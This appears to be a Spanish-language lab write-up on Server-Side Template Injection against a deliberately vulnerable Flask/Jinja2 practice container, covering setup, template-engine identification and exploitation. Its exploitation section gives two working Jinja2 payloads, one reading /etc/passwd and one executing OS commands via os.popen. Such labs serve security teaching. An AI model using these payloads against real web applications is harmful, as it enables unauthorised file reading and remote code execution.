---
title: "[Lab] Server-Side Template Injection (SSTI)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, flask]
---




# Server-Side Template Injection (SSTI)
    

### Más referencias:

- Links
    
    Infayer: Post Sobre SSTI - (”[https://infayer.com/archivos/803](https://infayer.com/archivos/803)”)
    
    HackTricks - (”[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)”)
    
    PayloadsAllTheThings - (”[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)”)
    
    Hackmetrix - (”[https://blog.hackmetrix.com/ssrf-server-side-request-forgery/](https://blog.hackmetrix.com/ssrf-server-side-request-forgery/)”)
    

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled.png)

## ¿Qué es Flask?

Flask es un framework escrito en Python que permite crear aplicaciones de forma sencilla y rápida. Es decir, un acelerador de tareas que funciona con pocas líneas de código y que ejecuta las aplicaciones rápidamente.

## Instalación

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```

## Introducción

La web vulnerable es una web que carga plantillas para representar contenido de forma dinámica de forma que cualquier cosa que se introduzca al parámetro “user”, se verá reflejado en la pantalla:

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 1.png)

Además, al utilizar la herramienta **whatweb**, se puede ver que la web por detrás utiliza python

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 2.png)

Si se ve que el input que ingresa el usuario se ve reflejado en la página web y además de ello, se descubre que por detrás se está empleando Python, se podría llegar a intentar un SSTI

Como parte de la metodología de actuación en estos casos, se va a tomar en cuenta el siguiente diagrama, que permitirá identificar el motor de plantilla empleado por esta aplicación web.

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 3.png)

Por tanto, se trasladará estas comprobaciones al objetivo para identificar el motor de plantilla.

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 4.png)

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 5.png)

Después de esta breve comprobación se tiene resuelta la primera necesidad: conocer el motor de plantilla empleado por la aplicación web, que en este caso se trata de **Jinja2**.

## Explotación

Existen muchos payloads para probar y en este caso se acudirá al repositorio de PayloadsAllTheThings para probar algunos payloads interesantes:

### Leer archivos del sistema:

```bash
{% raw %}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{% endraw %}
```

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 6.png)

### Ejecución de comandos:

```bash
{% raw %}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{% endraw %}
```

![Untitled](../assets/OWASP-TOP-10/Server-Side Template Injection (SSTI)/Untitled 7.png)

